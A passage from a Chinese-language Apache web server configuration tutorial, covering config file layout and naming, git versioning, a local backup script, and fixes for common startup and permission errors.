<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 显示编译选项</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -V</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 显示内建模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -l</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查找配置文件位置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -V</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> SERVER_CONFIG_FILE</span></span></code></pre></figure>
<hr/>
<h3 id="12-配置文件最佳实践">12. 配置文件最佳实践<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#12-配置文件最佳实践" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<h5 id="121-配置文件组织建议">12.1 配置文件组织建议<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#121-配置文件组织建议" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">/etc/apache2/</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">├──</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2.conf</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">          # 仅包含全局核心配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">├──</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ports.conf</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">            # 仅包含端口配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">├──</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> sites-available/</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">      # 虚拟主机配置（完整配置）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">│</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">   ├──</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> example.com.conf</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">│</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">   └──</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> test.local.conf</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">├──</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> sites-enabled/</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 符号链接到已启用的站点</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">├──</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> conf-available/</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">       # 自定义配置片段</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">│</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">   ├──</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> security.conf</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">│</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">   └──</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> performance.conf</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">└──</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> conf-enabled/</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">         # 符号链接到已启用的配置</span></span></code></pre></figure>
<h5 id="122-配置文件命名规范">12.2 配置文件命名规范<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#122-配置文件命名规范" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 虚拟主机配置文件命名</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">001-mainsite.conf</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 使用数字前缀控制加载顺序</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">010-example.com.conf</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">     # 主域名</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">020-test.local.conf</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">      # 测试站点</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 配置片段命名</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">security.conf</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">            # 安全配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">performance.conf</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">         # 性能配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">custom-errors.conf</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">       # 自定义错误页面</span></span></code></pre></figure>
<h5 id="123-配置文件注释规范">12.3 配置文件注释规范<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#123-配置文件注释规范" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ============================================</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 虚拟主机：example.com</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 用途：生产环境主站</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建：2024-01-15</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 修改：2024-11-05</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ============================================</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> *:80</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ------ 基本配置 ------</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> example.com</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    DocumentRoot</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /var/www/example</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ------ 日志配置 ------</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ErrorLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_LOG_DIR}/example-error.log</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    CustomLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_LOG_DIR}/example-access.log combined</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ------ 安全配置 ------</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 禁用目录列表</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/example</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> -Indexes +FollowSymLinks</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        AllowOverride</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> All</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # TODO: 添加SSL配置</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # FIXME: 优化缓存策略</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h5 id="124-配置版本控制">12.4 配置版本控制<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#124-配置版本控制" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 初始化Git仓库</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">cd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> git</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> init</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> git</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> add</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> .</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> git</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> commit</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -m</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;Initial Apache configuration&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 修改配置后提交</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> sites-available/example.com.conf</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> git</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> add</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> sites-available/example.com.conf</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> git</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> commit</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -m</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;Updated example.com: added SSL configuration&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 回滚配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> git</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> log</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --oneline</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> git</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> checkout</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &lt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">commit-has</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">h</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">></span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> sites-available/example.com.conf</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> reload</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span></code></pre></figure>
<h5 id="125-配置备份脚本">12.5 配置备份脚本<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#125-配置备份脚本" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#!/bin/bash</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># /usr/local/bin/backup-apache-config.sh</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">BACKUP_DIR</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;/backup/apache&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">DATE</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">date</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> +%Y%m%d-%H%M%S</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">mkdir</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $BACKUP_DIR</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 备份配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">tar</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -czf</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $BACKUP_DIR</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/apache-config-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DATE</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.tar.gz</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    /etc/apache2/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    /etc/ssl/certs/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    /etc/ssl/private/</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 保留最近30天的备份</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">find</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $BACKUP_DIR </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;apache-config-*.tar.gz&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -mtime</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> +30</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -delete</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;Backup completed: </span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$BACKUP_DIR</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/apache-config-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DATE</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.tar.gz&quot;</span></span></code></pre></figure>
<hr/>
<h3 id="13-常见配置错误与解决">13. 常见配置错误与解决<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#13-常见配置错误与解决" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<h3 id="错误1配置语法错误">错误1：配置语法错误<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#错误1配置语法错误" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<pre><code>AH00526: Syntax error on line 42 of /etc/apache2/sites-enabled/example.com.conf:
Invalid command 'SeverName', perhaps misspelled
</code></pre>
<p><strong>解决：</strong> 检查拼写，应为 <code>ServerName</code></p>
<h3 id="错误2模块未加载">错误2：模块未加载<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#错误2模块未加载" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<pre><code>Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included
</code></pre>
<p><strong>解决：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> rewrite</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span></code></pre></figure>
<h3 id="错误3端口冲突">错误3：端口冲突<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#错误3端口冲突" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<pre><code>(98)Address already in use: AH00072: make_sock: could not bind to address [::]:80
</code></pre>
<p><strong>解决：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查找占用端口的进程</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> netstat</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -tlnp</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> :80</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> fuser</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -k</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 80/tcp</span></span></code></pre></figure>
<h3 id="错误4权限问题">错误4：权限问题<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#错误4权限问题" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<pre><code>AH01630: client denied by server configuration
</code></pre>
<p><strong>解决：</strong> 检查 <code>Require</code> 指令和目录权限</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<hr/></article><hr/><div class="page-footer"></div></div><div class="right sidebar"><div class="graph"><h3>Graph View</h3><div class="graph-outer"><div class="graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:1,&quot;scale&quot;:1.1,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:false,&quot;enableRadial&quot;:false}"></div><button class="global-graph-icon" aria-label="Global Graph"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 55 55" fill="currentColor" xml:space="preserve"><path d="M49,0c-3.309,0-6,2.691-6,6c0,1.035,0.263,2.009,0.726,2.86l-9.829,9.829C32.542,17.634,30.846,17,29,17
                s-3.542,0.634-4.898,1.688l-7.669-7.669C16.785,10.424,17,9.74,17,9c0-2.206-1.794-4-4-4S9,6.794,9,9s1.794,4,4,4
                c0.74,0,1.424-0.215,2.019-0.567l7.669,7.669C21.634,21.458,21,23.154,21,25s0.634,3.542,1.688,4.897L10.024,42.562
                C8.958,41.595,7.549,41,6,41c-3.309,0-6,2.691-6,6s2.691,6,6,6s6-2.691,6-6c0-1.035-0.263-2.009-0.726-2.86l12.829-12.829
                c1.106,0.86,2.44,1.436,3.898,1.619v10.16c-2.833,0.478-5,2.942-5,5.91c0,3.309,2.691,6,6,6s6-2.691,6-6c0-2.967-2.167-5.431-5-5.91
                v-10.16c1.458-0.183,2.792-0.759,3.898-1.619l7.669,7.669C41.215,39.576,41,40.26,41,41c0,2.206,1.794,4,4,4s4-1.794,4-4
                s-1.794-4-4-4c-0.74,0-1.424,0.215-2.019,0.567l-7.669-7.669C36.366,28.542,37,26.846,37,25s-0.634-3.542-1.688-4.897l9.665-9.665
                C46.042,11.405,47.451,12,49,12c3.309,0,6-2.691,6-6S52.309,0,49,0z M11,9c0-1.103,0.897-2,2-2s2,0.897,2,2s-0.897,2-2,2
                S11,10.103,11,9z M6,51c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S8.206,51,6,51z M33,49c0,2.206-1.794,4-4,4s-4-1.794-4-4
                s1.794-4,4-4S33,46.794,33,49z M29,31c-3.309,0-6-2.691-6-6s2.691-6,6-6s6,2.691,6,6S32.309,31,29,31z M47,41c0,1.103-0.897,2-2,2
